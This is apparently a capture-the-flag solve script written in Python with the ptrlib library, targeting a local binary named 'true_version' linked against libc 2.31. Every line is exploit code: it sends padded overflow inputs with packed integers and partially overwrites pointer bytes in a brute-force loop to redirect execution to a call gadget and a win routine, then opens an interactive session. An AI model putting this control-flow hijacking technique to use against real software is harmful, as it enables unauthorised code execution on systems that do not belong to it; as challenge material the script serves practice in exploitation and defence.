from ptrlib import *

elf = ELF("../dist/true_version")
libc = ELF('../dist/libc-2.31.so')

while(1):
    try:
        io = Process("../dist/true_version")
        #io = Socket("localhost", 30022)

        #input()
        io.sendlineafter("Name > ", "N")
        io.sendlineafter("Words > ", "W")
        io.sendlineafter("Age > ", "256")
        io.sendlineafter("Job > ", "J")
        io.sendlineafter("> ", "4")

        # 1/16
        one_byte = 0x40
        io.sendlineafter("> ", b"C" * 0x18 + p32(0x4) + p32(0xffffffff)+ p8(one_byte))

        one_byte_for_mov_rax_qword_rsp_18_call_rax = 0x7c

        io.sendlineafter("> ", "4")
        io.sendlineafter("> ", p8(one_byte_for_mov_rax_qword_rsp_18_call_rax))
        io.sendlineafter("?\n", "NO")


        io.sendlineafter("> ", "2")
        io.sendlineafter("> ", b"B" * 0xe0 + p32(0x2) + p32(0xffffffff)+ p8(one_byte+0x20))

        win_byte = 0x69
        io.sendlineafter("> ", "4")
        io.sendlineafter("> ", p8(win_byte))
        io.sendlineafter("?\n", "YES")
        break
    except TimeoutError as e:
        print(e)

io.interactive()
